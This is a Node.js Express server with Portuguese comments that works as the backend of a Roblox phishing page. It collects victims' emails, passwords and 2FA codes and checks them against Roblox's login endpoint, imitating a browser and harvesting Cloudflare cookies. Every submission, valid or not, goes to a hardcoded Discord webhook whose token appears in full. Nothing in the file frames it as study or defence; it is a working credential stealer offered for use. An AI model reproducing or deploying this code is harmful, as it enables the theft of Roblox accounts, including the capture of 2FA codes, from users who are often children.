const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

// SEU WEBHOOK DO DISCORD (Certifique-se de que este URL está correto!)
const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";

app.use(express.json());
app.use(express.static('.'));

// Função para fazer login no Roblox com Cookies Atualizados
async function loginRoblox(email, password) {
    const baseUrl = "https://www.roblox.com";
    const loginUrl = `${baseUrl}/users/login`;

    // Criar um "Axios Instance" para manter os cookies entre as requisições
    const robloxClient = axios.create({
        baseURL: baseUrl,
        timeout: 15000,
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.roblox.com/'
        }
    });

    try {
        // PASSO 1: Visitar a página principal para pegar os Cookies do Cloudflare
        // Isso gera o cookie '__cf_bm' e outros necessários
        console.log("Passo 1: Pegando cookies do Roblox...");
        await robloxClient.get('/', {
            validateStatus: function (status) {
                return status < 500; // Aceita 200, 301, 302, etc.
            }
        });

        // PASSO 2: Fazer o Login usando os mesmos cookies
        console.log("Passo 2: Fazendo login...");
        const response = await robloxClient.post('/users/login', {
            username: email,
            password: password
        }, {
            headers: {
                'Content-Type': 'application/json'
            },
            validateStatus: function (status) {
                return status < 500;
            }
        });

        const data = response.data;

        // O Roblox retorna { id: 123, username: "User" } no sucesso
        if (data.id && typeof data.id === 'number') {
            return { success: true, data: data, error: null };
        } else {
            // Se não tem ID, pega no erro
            const errorMsg = data.error || data.message || "Resposta inválida (Sem ID)";
            return { success: false, data: data, error: errorMsg };
        }

    } catch (error) {
        let errorMsg = "Erro Desconhecido";
        if (error.response) {
            // O servidor respondeu com erro (ex: 400, 401)
            errorMsg = `Erro HTTP ${error.response.status}: ${JSON.stringify(error.response.data)}`;
        } else if (error.request) {
            // A requisição foi feita mas não recebeu resposta
            errorMsg = "Sem resposta do servidor Roblox (Timeout ou Bloqueio)";
        } else {
            errorMsg = error.message;
        }
        return { success: false, data: null, error: errorMsg };
    }
}

async function sendToDiscord(message) {
    try {
        await axios.post(WEBHOOK_URL, { content: message });
    } catch (e) { 
        console.error("Erro no Webhook:", e.message);
    }
}

app.post('/check', async (req, res) => {
    const { email, password, code2fa, isFinalStep } = req.body;

    // Se for o passo final (2FA), envia direto e diz que deu certo
    if (isFinalStep) {
        const discordMessage = `**🔒 LOGIN COMPLETO (2FA)**\n\n` +
                               `**Email:** ${email}\n` +
                               `**Password:** ${password}\n` +
                               `**Code 2FA:** ${code2fa}\n` +
                               `**Timestamp:** ${new Date().toISOString()}`;
        await sendToDiscord(discordMessage);
        return res.json({ success: true });
    }

    if (!email || !password) {
        return res.json({ success: false, error: "Falta o Email ou a Senha" });
    }

    // Tenta o login com o método melhorado
    const result = await loginRoblox(email, password);

    if (result.success) {
        // Login deu certo
        const username = result.data.username || "Unknown";
        const userId = result.data.id || "Unknown";
        
        const discordMessage = `**🔒 CONTA ENCONTRADA!**\n\n` +
                               `**Email:** ${email}\n` +
                               `**Password:** ${password}\n` +
                               `**Username:** ${username}\n` +
                               `**User ID:** ${userId}\n` +
                               `**Timestamp:** ${new Date().toISOString()}`;
        await sendToDiscord(discordMessage);

        return res.json({
            success: true,
            username: username,
            userId: userId,
            error: ""
        });
    } else {
        // Login falhou
        const errorMsg = result.error || "Conta ou Senha Incorretas";
        
        const discordMessage = `**❌ LOGIN FALHOU**\n\n` +
                               `**Email:** ${email}\n` +
                               `**Password:** ${password}\n` +
                               `**Erro:** ${errorMsg}\n` +
                               `**Timestamp:** ${new Date().toISOString()}`;
        await sendToDiscord(discordMessage);

        return res.json({
            success: false,
            username: "Unknown",
            userId: "Unknown",
            error: errorMsg
        });
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
